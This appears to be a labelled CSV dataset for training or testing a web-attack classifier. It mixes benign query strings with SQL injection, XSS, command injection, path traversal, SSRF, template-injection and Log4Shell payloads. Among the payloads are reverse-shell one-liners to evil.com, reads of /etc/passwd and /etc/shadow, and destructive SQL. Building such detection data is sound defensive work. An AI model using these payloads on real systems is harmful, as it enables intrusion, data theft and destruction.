"payload","label"
"sort=asc&lang=en&category=books&offset=0","0"
"name=' OR 1=1#","1"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","0"
"'; EXEC('SEL'+'ECT 1')--","1"
"/robots.txt","0"
"locale=fr_FR","0"
"1'; CALL system('ls -la')--","1"
"token=abcdef","0"
"' OR '1'='1","1"
"1' OR '1'='1'--","1"
"user=bob&sort=asc&name=Alice&debug=false","0"
"user=bob&limit=20","0"
"id=7","0"
"id=7&email=bob%40example.com&category=books","0"
"<<SCRIPT>alert(1)//<</SCRIPT>","2"
"offset=0&id=7&category=books&token=abcdef&q=test","0"
"%c0%ae%c0%ae%c0%af","4"
"1' LIMIT 1 OFFSET 0--","1"
"data://text/plain,<?php phpinfo();?>","4"
"format=json","0"
"';alert(1)//","2"
"'; REVOKE ALL PRIVILEGES ON *.* FROM 'admin'@'localhost'--","1"
"debug=false","0"
"name=Alice&token=abcdef&offset=0","0"
"comment=Great product! Worth every penny.","0"
"<%= 7 * 7 %>","5"
"/admin/dashboard","0"
"1 OR COS(0)=1","1"
"%0aid","3"
"name=Alice","0"
"color=blue","0"
"format=json&lang=en","0"
"sort=asc&limit=20&lang=en&filter=active","0"
"http://legit.com@evil.com","5"
"<img src=x onerror=alert('XSS')>","2"
"page=3&debug=false&limit=20&lang=en","0"
"/../../../../../../etc/shadow","4"
"{""notification_type"": ""email"", ""enabled"": true, ""frequency"": ""daily""}","0"
"<form><button formaction=javascript:alert(1)>click","2"
"| ps -ef","3"
"sort=asc&email=bob%40example.com&user=bob&q=test","0"
"search=' UNION SELECT null--","1"
"filter=active&id=7&debug=false&q=test&lang=en","0"
"; cat /etc/passwd","3"
"limit=20&category=books&name=Alice&q=test&offset=0","0"
"format=csv","0"
"'; INSERT INTO users (username,password) VALUES ('hacker','hacker')--","1"
"category=books&filter=active&format=json&user=bob&email=bob%40example.com","0"
"q=test&user=bob&id=7&limit=20","0"
"format=json&token=abcdef&limit=20&sort=asc","0"
"${jndi:rmi://evil.com/a}","5"
"%0d%0a ls","3"
"expression(alert(1))","2"
"preview=false","0"
"download=true","0"
"| php -r '$sock=fsockopen(""evil.com"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'","3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"/sitemap.xml","0"
"<details open ontoggle=alert(1)>","2"
"<embed src=javascript:alert(1)>","2"
"{""items"": [{""id"": 42, ""qty"": 2}, {""id"": 15, ""qty"": 1}], ""coupon"": ""SAVE10""}","0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15","0"
"created_after=2023-06-01T00:00:00Z","0"
"& dir","3"
"/etc/hostname","4"
"token=abcdef&id=7&category=books&debug=false","0"
"; id","3"
"..%0d/etc/passwd","4"
"1' OR 'x'='x","1"
"email=bob%40example.com&token=abcdef&format=json","0"
"& cat /etc/passwd","3"
"admin%0b'OR'%0b'1'%3D'1","1"
"<svg><script>alert(1)</script></svg>","2"
"../../../../../../../../../etc/passwd%00","4"
"' AND 0x01=0x01--","1"
"/blog/2024/machine-learning-basics","0"
"///evil.com","5"
"| dir","3"
"a' OR 1=1-- -","1"
"1; DROP TABLE users--","1"
"email=bob%40example.com","0"
"q=test&lang=en&limit=20","0"
"sort=asc","0"
"id=7&user=bob&name=Alice&token=abcdef","0"
"id=7&user=bob&email=bob%40example.com&category=books","0"
"/static/media/photo.jpg","0"
"<script>alert(String.fromCharCode(88,83,83))</script>","2"
"q=test&id=7&user=bob&lang=en","0"
"id=7&token=abcdef&name=Alice","0"
"1' AND BENCHMARK(1000000,MD5(1))--","1"
"lang=en&user=bob&limit=20&id=7","0"
"<svg onload=alert(1)>","2"
"width=100px","0"
"../../../../etc/passwd","4"
"filename=report.pdf | id","3"
"</title><script>alert(1)</script>","2"
"constructor.prototype.admin=true","5"
"category=books&id=7","0"
"date=2024-01-15","0"
""";alert(1)//","2"
"| uname -r","3"
"lang=en&user=bob","0"
"https://www.example.com/products?id=42&ref=homepage","0"
"/*!50000 SELECT*/ 1","1"
"profile_picture.jpg","0"
"limit=20&offset=0&user=bob&page=3&name=Alice","0"
"q=<img src=x onerror=alert(document.cookie)>","2"
"<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>","2"
"page=3&limit=20&name=Alice&format=json","0"
"/docs/api-reference#authentication","0"
"1; INSERT INTO admin VALUES('hacked','hacked')--","1"
"format=json&sort=asc&email=bob%40example.com","0"
"q=test&format=json&id=7&name=Alice&lang=en","0"
"1 OR 1>0","1"
"id=7","0"
"&& id","3"
"scope=read+write+profile","0"
"admin'--","1"
"limit=20&email=bob%40example.com&user=bob","0"
"http://metadata.google.internal/computeMetadata/v1/","5"
"1 | ls #","3"
"q=test&token=abcdef&user=bob&name=Alice&debug=false","0"
"' OR ''-''","1"
"& shutdown /s /f /t 0","3"
"/docs/getting-started","0"
"offset=0&debug=false&page=3","0"
"status=active","0"
"/images/products/shoe-42.webp","0"
"filter=active&category=books&format=json&sort=asc","0"
"%0a ls","3"
"?__proto__[shell]=touch${IFS}/tmp/pwned","5"
"UNION SELECT user(), database(), version()--","1"
"..\..\etc\passwd","4"
"q=test&page=3&debug=false&format=json","0"
"category=books&sort=asc&id=7","0"
"q=test&email=bob%40example.com","0"
"1' AND/**/1=1--","1"
"../../etc/passwd","4"
"temperature=23.4","0"
"lang=en&filter=active","0"
"; nc -e /bin/sh evil.com 4444","3"
"email=bob%40example.com&token=abcdef","0"
"user=bob&id=7","0"
"$(id)","3"
"filter=active&q=test&limit=20&email=bob%40example.com","0"
"${IFS}id","3"
"' UNION ALL SELECT null,table_name FROM information_schema.tables--","1"
"limit=20&offset=0&debug=false&q=test","0"
"page=3&q=test&email=bob%40example.com&limit=20&lang=en","0"
"{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}","5"
"<svg/onload=alert(1)>","2"
"format=json&filter=active&token=abcdef&sort=asc","0"
"filter=active&id=7&debug=false","0"
"limit=20","0"
"format=json&offset=0&filter=active&debug=false","0"
"${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.com/a}","5"
"<script>alert('XSS')</script>","2"
"| tee /tmp/pwned","3"
"C:\Windows\win.ini","4"
"limit=20&id=7&q=test&debug=false&user=bob","0"
"name=Alice&lang=en","0"
"Thank you for your help with the issue.","0"
"' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--","1"
"q=test&lang=en&page=3&sort=asc&debug=false","0"
"1 AND (ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1))))>64","1"
"search=hello+world","0"
"onchange=alert(1)","2"
"/static/css/app.min.css","0"
"email=bob%40example.com&category=books","0"
"category=books&limit=20&name=Alice&filter=active&sort=asc","0"
"limit=20&page=3&category=books&user=bob&sort=asc","0"
"id=1 UNION SELECT 1,2,3--","1"
"' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--","1"
"limit=20&format=json","0"
"lang=en&user=bob&offset=0&filter=active","0"
"token=abcdef&format=json&user=bob&id=7&page=3","0"
"page=1&per_page=20&sort=created_at&order=desc","0"
"debug=false&format=json&page=3&q=test&user=bob","0"
"{{self.__dict__}}","5"
"I am interested in the premium subscription plan.","0"
"v=2","0"
"q=test","0"
"email=bob%40example.com&lang=en&token=abcdef&q=test","0"
"/css/main.css","0"
"offset=0&sort=asc&lang=en","0"
"user=bob&page=3","0"
"format=json&category=books&offset=0&name=Alice&id=7","0"
"page=3&format=json&limit=20","0"
"title=C# vs C++: Which Should You Learn?","0"
"pgsleeep(5)--","1"
"| ip addr","3"
"email=bob%40example.com","0"
"' OR 'unusual' = 'unusual'","1"
"../../../../../../../../../../etc/passwd%00.jpg","4"
"{""latitude"": 40.7128, ""longitude"": -74.0060, ""radius_km"": 5}","0"
"class=btn btn-primary","0"
"into outfile '/var/www/shell.php'","1"
"; echo vulnerable > /tmp/pwned","3"
"lang=en","0"
"'; ALTER USER 'root'@'localhost' IDENTIFIED BY 'newpass'--","1"
"api_version=2024-01","0"
"filter=active&sort=asc","0"
"; ruby -rsocket -e 'f=TCPSocket.open(""evil.com"",4444).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'","3"
"{""name"": ""John"", ""age"": 30, ""city"": ""New York""}","0"
"%c0%ae%c0%ae/etc/passwd","4"
"$(cat /etc/passwd)","3"
"filter=active&category=books&user=bob&limit=20","0"
